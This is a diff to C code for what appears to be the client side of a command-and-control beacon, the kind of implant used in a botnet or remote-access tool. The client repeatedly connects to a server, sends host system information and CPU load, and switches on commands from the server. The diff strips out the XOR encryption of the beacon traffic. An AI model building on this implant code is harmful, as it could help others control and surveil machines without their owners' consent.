@@ -47,17 +47,12 @@ bool net_client(char *host, int port){
   server.sin_addr.s_addr = inet_addr(host);
   server.sin_port        = htons(port);
 
-  // server beacon setup
   net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
   
-  // client beacon setup
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
   p_net_client_beacon->xor_key = DEFS_XOR_KEY;
   p_net_client_beacon->sysinfo = *sys_info();
 
-  crypt_encrypt_xor((void *)p_net_client_beacon,
-                    sizeof(net_client_beacon_t),
-                    p_net_client_beacon->xor_key);
   while(true){
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd < 0){
@@ -78,9 +73,6 @@ bool net_client(char *host, int port){
 
     while(true){
       p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
-      crypt_encrypt_xor_all((void *)&p_net_client_beacon->sysinfo.cpu_usage,
-                        sizeof(int),
-                        DEFS_XOR_KEY);
       if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
         fprintf(stderr,
                 "[-] failed to send data to %s:%d\n",
@@ -95,11 +87,10 @@ bool net_client(char *host, int port){
                 ntohs(server.sin_port));
         break;
       } else{
-        crypt_decrypt_xor((void *)p_net_server_beacon,
-                          sizeof(net_server_beacon_t),
-                          DEFS_XOR_KEY);
+        /* crypt_decrypt_xor((void *)p_net_server_beacon, */
+        /*                   sizeof(net_server_beacon_t), */
+        /*                   DEFS_XOR_KEY); */
         if (p_net_server_beacon->status == true){
-          // command handler
           switch(p_net_server_beacon->command){
           case NET_SERVER_CMD_BEACON:
             printf("[+] %s:%d OK\n",
